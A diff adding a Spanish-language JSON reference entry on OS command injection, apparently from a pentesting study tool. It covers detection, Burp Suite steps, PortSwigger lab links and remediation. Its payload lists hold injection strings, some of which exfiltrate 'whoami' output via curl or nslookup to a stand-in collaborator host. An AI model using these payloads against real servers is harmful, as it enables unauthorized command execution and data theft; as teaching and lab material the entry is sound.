@@ -1,0 +1,59 @@
+{
+  "id": "os-command-injection",
+  "name": "OS Command Injection",
+  "category": "Injection",
+  "severity": "Critical",
+  "aka": ["Command Injection", "RCE via shell"],
+  "summary": "El input del usuario llega a una llamada del sistema operativo sin sanitizar, permitiendo ejecutar comandos arbitrarios en el servidor.",
+  "where_to_look": [
+    "Funciones que invocan utilidades del SO: ping, nslookup, conversión de imágenes, envío de email.",
+    "Parámetros que parecen pasar a herramientas de línea de comandos.",
+    "Subida/procesamiento de archivos que dispara binarios externos."
+  ],
+  "detection": [
+    "Inyecta separadores de comandos y observa si se ejecuta algo extra: ; | & && ||.",
+    "Usa un comando con efecto medible: un retardo (sleep/ping) o una interacción OAST.",
+    "Para ciega, redirige la salida a un archivo accesible o exfiltra vía DNS/HTTP a Collaborator."
+  ],
+  "burp_steps": [
+    "Manda la petición al Repeater e inyecta `; whoami` o `& whoami &` según el contexto.",
+    "Si no ves salida, fuerza un retardo: `& ping -c 10 127.0.0.1 &` y mide el tiempo de respuesta.",
+    "Para confirmar OAST: `& nslookup BURP-COLLAB &` y revisa interacciones DNS.",
+    "Exfiltra salida ciega: `& nslookup `whoami`.BURP-COLLAB &` (sustituye el subdominio)."
+  ],
+  "payloads": {
+    "Separadores": [
+      "; whoami",
+      "| whoami",
+      "& whoami &",
+      "`whoami`",
+      "$(whoami)",
+      "%0a whoami"
+    ],
+    "Retardo (ciega por tiempo)": [
+      "& ping -c 10 127.0.0.1 &",
+      "& sleep 10 &",
+      "|| ping -n 10 127.0.0.1 ||"
+    ],
+    "Exfiltración OAST": [
+      "& nslookup BURP-COLLAB &",
+      "& nslookup `whoami`.BURP-COLLAB &",
+      "; curl http://BURP-COLLAB/?o=$(whoami)"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "Evita llamar a la shell; usa APIs nativas del lenguaje.",
+    "Si es inevitable, pasa argumentos por arrays (no string), sin interpretación de shell.",
+    "Valida el input contra una allowlist estricta."
+  ],
+  "portswigger_labs": [
+    {"title": "Command injection simple", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/os-command-injection/lab-simple"},
+    {"title": "Command injection ciega con retardos de tiempo", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays"},
+    {"title": "Ciega con exfiltración OAST", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band"}
+  ],
+  "references": [
+    {"title": "PortSwigger — OS command injection", "url": "https://portswigger.net/web-security/os-command-injection"},
+    {"title": "OWASP — Command Injection", "url": "https://owasp.org/www-community/attacks/Command_Injection"}
+  ]
+}
